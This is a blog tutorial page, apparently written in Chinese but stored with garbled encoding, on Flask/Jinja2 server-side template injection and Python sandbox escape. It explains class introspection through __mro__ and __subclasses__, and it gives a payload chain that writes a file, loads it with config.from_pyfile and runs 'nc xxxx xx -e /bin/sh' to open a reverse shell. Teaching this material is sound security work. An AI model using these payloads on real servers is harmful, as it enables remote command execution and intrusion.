

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Yu ting">
  <meta name="keywords" content="">
  <title>SSTI(äºŒ) - Fearless&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
  



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"fearless.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Fearless's blog" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="SSTI(äºŒ)">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-04-06 19:58" pubdate>
        April 6, 2021 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      3.5k å­—
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      55
       åˆ†é’Ÿ
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">SSTI(äºŒ)</h1>
            
            <div class="markdown-body">
              <h4 id="å‘½ä»¤æ‰§è¡Œ"><a class="header-anchor" href="#å‘½ä»¤æ‰§è¡Œ">ğŸ­</a>å‘½ä»¤æ‰§è¡Œ</h4>
<p>å‘½ä»¤æ‰§è¡Œï¼Œå…¶å®å°±æ˜¯æ²™ç›’æº¢å‡ºçš„æ“ä½œã€‚</p>
<h5 id="tips1"><a class="header-anchor" href="#tips1">ğŸ­</a>tips1</h5>
<blockquote>
<p>from_pyfile</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">from_pyfile</span>(<span class="hljs-params">self, filename, silent=False</span>):</span>

 filename = os.path.join(self.root_path, filename)
 d = types.ModuleType(<span class="hljs-string">&#x27;config&#x27;</span>)
 d.__file__ = filename
 <span class="hljs-keyword">try</span>:
     <span class="hljs-keyword">with</span> open(filename) <span class="hljs-keyword">as</span> config_file:
         exec(compile(config_file.read(), filename, <span class="hljs-string">&#x27;exec&#x27;</span>), d.__dict__)
 <span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:
     <span class="hljs-keyword">if</span> silent <span class="hljs-keyword">and</span> e.errno <span class="hljs-keyword">in</span> (errno.ENOENT, errno.EISDIR):
         <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
     e.strerror = <span class="hljs-string">&#x27;Unable to load configuration file (%s)&#x27;</span> % e.strerror
     <span class="hljs-keyword">raise</span>
 self.from_object(d)
 <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></code></pre>
<p>from_object</p>
<pre><code class="hljs ruby"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">from_object</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, obj)</span></span><span class="hljs-symbol">:</span>

 <span class="hljs-keyword">if</span> isinstance(obj, string_types)<span class="hljs-symbol">:</span>
     obj = import_string(obj)
 <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dir(obj)<span class="hljs-symbol">:</span>
     <span class="hljs-keyword">if</span> key.isupper()<span class="hljs-symbol">:</span>
         <span class="hljs-keyword">self</span>[key] = getattr(obj, key)</code></pre>
<p>æ­¤æ–¹æ³•å°†ä¼ å…¥çš„æ–‡ä»¶ä½¿ç”¨ compile() è¿™ä¸ªpython çš„å†…ç½®æ–¹æ³•å°†å…¶ç¼–è¯‘æˆå­—èŠ‚ç (.pyc),å¹¶æ”¾åˆ° exec() é‡Œé¢å»æ‰§è¡Œï¼Œå‚æ•° <code>d.__dict__</code>çš„å«ä¹‰æ˜¯æŒ‡å®š exec æ‰§è¡Œçš„ä¸Šä¸‹æ–‡ã€‚æ­¤æ–¹æ³•æ‰§è¡Œçš„ä»£ç ç‰‡æ®µè¢«æ”¾å…¥äº† <code>d.__dict__</code> ä¸­,å¹¶åœ¨åé¢è°ƒç”¨äº† from_object() æ–¹æ³•ï¼Œæ­¤æ–¹æ³•ä¼šéå†  Obj çš„ dict å¹¶ä¸”æ‰¾åˆ°å¤§å†™å­—æ¯çš„å±æ€§ï¼Œå°†å±æ€§çš„å€¼ç»™ self[â€˜å±æ€§åâ€™]ï¼Œå¦‚æœèƒ½è®© from_pyfile å»è¯»è¿™æ ·çš„ä¸€ä¸ªæ–‡ä»¶ï¼š</p>
<pre><code class="hljs routeros"><span class="hljs-keyword">from</span> os import system
SHELL = system</code></pre>
<p>æˆ‘ä»¬å°±èƒ½é€šè¿‡ config[â€˜SHELLâ€™] è°ƒç”¨ system æ–¹æ³•äº†ï¼Œæ–‡ä»¶æ€ä¹ˆå†™å…¥å°±éœ€è¦ç»•è¿‡æ²™ç›’çš„æ–¹å¼å†™å…¥æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶ã€‚</p>
<p>payloadï¼š</p>
<pre><code class="hljs markdown">&#123; &#123; &#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/tmp/evil&#x27;, &#x27;w&#x27;</span>).write(&#x27;from os import system%0aSHELL = system&#x27;) &#125; &#125;
//å†™æ–‡ä»¶
&#123; &#123; config.from<span class="hljs-emphasis">_pyfile(&#x27;/tmp/evil&#x27;) &#125; &#125;</span>
<span class="hljs-emphasis">//åŠ è½½system</span>
<span class="hljs-emphasis">&#123; &#123; config[<span class="hljs-string">&#x27;SHELL&#x27;</span>](<span class="hljs-link">&#x27;nc xxxx xx -e /bin/sh&#x27;</span>) &#125; &#125;</span>
<span class="hljs-emphasis">//æ‰§è¡Œå‘½ä»¤åå¼¹SHELL</span></code></pre>
</blockquote>
<h5 id="tips2"><a class="header-anchor" href="#tips2">ğŸ­</a>tips2</h5>
<p>åœ¨pythonä¸­ï¼Œobjectç±»æ˜¯Pythonä¸­æ‰€æœ‰ç±»çš„åŸºç±»ï¼Œå¦‚æœå®šä¹‰ä¸€ä¸ªç±»æ—¶æ²¡æœ‰æŒ‡å®šç»§æ‰¿å“ªä¸ªç±»ï¼Œåˆ™é»˜è®¤ç»§æ‰¿objectç±»ã€‚</p>
<p>è¿è¡Œä»£ç :</p>
<pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>.__class__)</span></span></code></pre>
<p>è¿”å›äº†&lt;class â€˜strâ€™&gt;ï¼Œå¯¹äºä¸€ä¸ªç©ºå­—ç¬¦ä¸²ä»–å·²ç»æ‰“å°äº†strç±»å‹ï¼Œåœ¨pythonä¸­ï¼Œæ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ª<strong>bases</strong>å±æ€§ï¼Œåˆ—å‡ºå…¶åŸºç±».</p>
<pre><code class="hljs reasonml">print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>)</span></span></code></pre>
<p>æ‰“å°è¿”å›(&lt;class â€˜objectâ€™&gt;,)ï¼Œæˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†ä»–çš„åŸºç±»objectï¼Œè€Œæˆ‘ä»¬æƒ³è¦å¯»æ‰¾objectç±»çš„ä¸ä»…ä»…åªæœ‰basesï¼ŒåŒæ ·å¯ä»¥ä½¿ç”¨<strong>mro</strong>ï¼Œ<strong>mro</strong>ç»™å‡ºäº†method resolution orderï¼Œå³è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºã€‚æˆ‘ä»¬å®ä¾‹æ‰“å°ä¸€ä¸‹mroã€‚</p>
<pre><code class="hljs reasonml">print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>)</span></span></code></pre>
<p>è¿”å›äº†(&lt;class â€˜strâ€™&gt;, &lt;class â€˜objectâ€™&gt;)ï¼ŒåŒæ ·å¯ä»¥æ‰¾åˆ°objectç±»ï¼Œæ­£æ˜¯ç”±äºè¿™äº›ä½†ä¸ä»…é™äºè¿™äº›æ–¹æ³•ï¼Œæˆ‘ä»¬æ‰æœ‰äº†å„ç§æ²™ç®±é€ƒé€¸çš„å§¿åŠ¿ã€‚æ­£å¦‚ä¸Šé¢çš„è§£é‡Šï¼Œ<strong>mro</strong>è¿”å›äº†è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºï¼Œå°†ä¼šæ‰“å°ä¸¤ä¸ªã€‚åœ¨flask sstiä¸­pocä¸­å¾ˆå¤§ä¸€éƒ¨åˆ†æ˜¯ä»objectç±»ä¸­å¯»æ‰¾æˆ‘ä»¬å¯åˆ©ç”¨çš„ç±»çš„æ–¹æ³•ã€‚æ¥ä¸‹æ¥ä½¿ç”¨subclassesï¼ˆè¿”å›çš„æ˜¯è¿™ä¸ªç±»çš„å­ç±»çš„é›†åˆï¼Œä¹Ÿå°±æ˜¯objectç±»çš„å­ç±»çš„é›†åˆï¼‰</p>
<pre><code class="hljs reasonml">print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>].<span class="hljs-constructor">__subclasses__()</span>)</code></pre>
<p>python 3.6 ç‰ˆæœ¬ä¸‹çš„objectç±»ä¸‹çš„æ–¹æ³•é›†åˆã€‚<strong>2.7å’Œ3.6ç‰ˆæœ¬è¿”å›çš„å­ç±»ä¸æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯2.7æœ‰çš„3.6å¤§éƒ¨åˆ†éƒ½æœ‰</strong>ã€‚éœ€è¦è‡ªå·±å¯»æ‰¾åˆé€‚çš„æ ‡å·æ¥è°ƒç”¨ã€‚</p>
<p>ä¸¾ä¸ªæ —å­:<strong>åœ¨pythonç¯å¢ƒä¸‹ï¼Œä¸ç›´æ¥ä½¿ç”¨openæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶</strong></p>
<pre><code class="hljs delphi"><span class="hljs-comment">// python2</span>
&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.__class__
&lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;
&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__
(&lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)
&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()
[&lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.getwindowsversion&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;nt.stat_result&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;nt.statvfs_result&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;MultibyteCodec&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;MultibyteIncrementalEncoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;MultibyteIncrementalDecoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;MultibyteStreamReader&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;MultibyteStreamWriter&#x27;</span>&gt;]</code></pre>
<p>è¿™æ ·ä¸å¥½æŸ¥çœ‹ï¼Œæšä¸¾ä¸€ä¸‹ï¼š</p>
<p><img src="/2021/04/06/wei4/1.png" srcset="/img/loading.gif" alt="1"></p>
<h3 id="æ²™ç›’é€ƒé€¸åŸç†"><a class="header-anchor" href="#æ²™ç›’é€ƒé€¸åŸç†">ğŸ­</a>æ²™ç›’é€ƒé€¸åŸç†</h3>
<p><strong>æ²™ç›’/æ²™ç®±</strong></p>
<p>æ²™ç®±åœ¨æ—©æœŸä¸»è¦ç”¨äºæµ‹è¯•å¯ç–‘è½¯ä»¶ï¼Œæµ‹è¯•ç—…æ¯’å±å®³ç¨‹åº¦ç­‰ç­‰ã€‚åœ¨æ²™ç®±ä¸­è¿è¡Œï¼Œå³ä½¿ç—…æ¯’å¯¹å…¶é€ æˆäº†ä¸¥é‡å±å®³ï¼Œä¹Ÿä¸ä¼šå¨èƒåˆ°çœŸå®ç¯å¢ƒï¼Œæ²™ç®±é‡æ„ä¹Ÿååˆ†ä¾¿æ·ã€‚æœ‰ç‚¹ç±»ä¼¼è™šæ‹Ÿæœºçš„åˆ©ç”¨ã€‚</p>
<p>æ²™ç®±é€ƒé€¸,å°±æ˜¯åœ¨ç»™æˆ‘ä»¬çš„ä¸€ä¸ªä»£ç æ‰§è¡Œç¯å¢ƒä¸‹,è„±ç¦»ç§ç§è¿‡æ»¤å’Œé™åˆ¶,æœ€ç»ˆæˆåŠŸæ‹¿åˆ°shellæƒé™çš„è¿‡ç¨‹ã€‚å…¶å®å°±æ˜¯é—¯è¿‡é‡é‡é»‘åå•ï¼Œæœ€ç»ˆæ‹¿åˆ°ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæƒé™çš„è¿‡ç¨‹</p>
<p>pythonç±»ç»§æ‰¿ï¼š</p>
<pre><code class="hljs awk">__base__ <span class="hljs-regexp">//</span>å¯¹è±¡çš„ä¸€ä¸ªåŸºç±»ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯objectï¼Œæœ‰æ—¶ä¸æ˜¯ï¼Œè¿™æ—¶éœ€è¦ä½¿ç”¨ä¸‹ä¸€ä¸ªæ–¹æ³•

__mro__ <span class="hljs-regexp">//</span>åŒæ ·å¯ä»¥è·å–å¯¹è±¡çš„åŸºç±»ï¼Œåªæ˜¯è¿™æ—¶ä¼šæ˜¾ç¤ºå‡ºæ•´ä¸ªç»§æ‰¿é“¾çš„å…³ç³»ï¼Œæ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œobjectåœ¨æœ€åº•å±‚æ•…åœ¨åˆ—è¡¨ä¸­çš„æœ€åï¼Œé€šè¿‡__mro__[-<span class="hljs-number">1</span>]å¯ä»¥è·å–åˆ°

__subclasses__() <span class="hljs-regexp">//</span>ç»§æ‰¿æ­¤å¯¹è±¡çš„å­ç±»ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨</code></pre>
<p>å¯ä»¥ä»ä»»ä½•ä¸€ä¸ªå˜é‡ï¼Œå›æº¯åˆ°åŸºç±»ä¸­å»ï¼Œå†è·å¾—åˆ°æ­¤åŸºç±»æ‰€æœ‰å®ç°çš„ç±»ï¼Œå°±å¯ä»¥è·å¾—åˆ°å¾ˆå¤šçš„ç±»ã€‚</p>
<h3 id="payload"><a class="header-anchor" href="#payload">ğŸ­</a>payload</h3>
<h4 id="python2"><a class="header-anchor" href="#python2">ğŸ­</a>python2</h4>
<p>æƒ³è¦ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„payloadåªéœ€è¦æœ‰osæ¨¡å—æ‰§è¡Œos.systemå³å¯ï¼š</p>
<pre><code class="hljs livecodeserver"><span class="hljs-built_in">num</span> = <span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> <span class="hljs-keyword">item</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">-1</span>].__subclasses__():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">item</span>.__init__.__globals__:
            print <span class="hljs-built_in">num</span>,<span class="hljs-keyword">item</span>
        <span class="hljs-built_in">num</span>+=<span class="hljs-number">1</span>
    except:
        <span class="hljs-built_in">num</span>+=<span class="hljs-number">1</span>

<span class="hljs-comment">#72 &lt;class &#x27;site._Printer&#x27;&gt;</span>
<span class="hljs-comment">#77 &lt;class &#x27;site.Quitter&#x27;&gt;</span></code></pre>
<p>payloadï¼š</p>
